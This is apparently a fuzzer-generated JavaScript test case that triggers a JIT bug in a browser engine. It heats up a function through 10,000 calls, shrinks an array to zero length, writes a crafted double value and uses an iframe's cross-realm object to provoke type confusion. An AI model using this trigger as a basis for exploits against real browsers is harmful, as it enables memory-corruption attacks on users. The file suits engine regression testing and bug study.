try {
    function opt(a1, a2) {
        a2[0] = 1.1;
        a1.a = a2;
        a2["leng" + "th"] = 0;
        a2[0] = 2.3023e-320;
    }
    let v12;
    try { v12 = document.createElement("iframe"); } catch (e) {}
    const v13 = document?.body;
    let v14;
    try { v14 = v13.appendChild(v12); } catch (e) {}
    const v15 = v14?.contentWindow;
    let v16;
    try { v16 = v15.eval("({})"); } catch (e) {}
    let x_obj = v16;
    let arr = [1.1,1.1];
    for (let i23 = 0; i23 < 10000; i23++) {
        let v29;
        try { v29 = arr.concat(); } catch (e) {}
        try { opt(x_obj, v29); } catch (e) {}
    }
    try { opt(x_obj, arr); } catch (e) {}
    arr[1] = {};
    try { console.log(arr); } catch (e) {}
} catch(e35) {
}
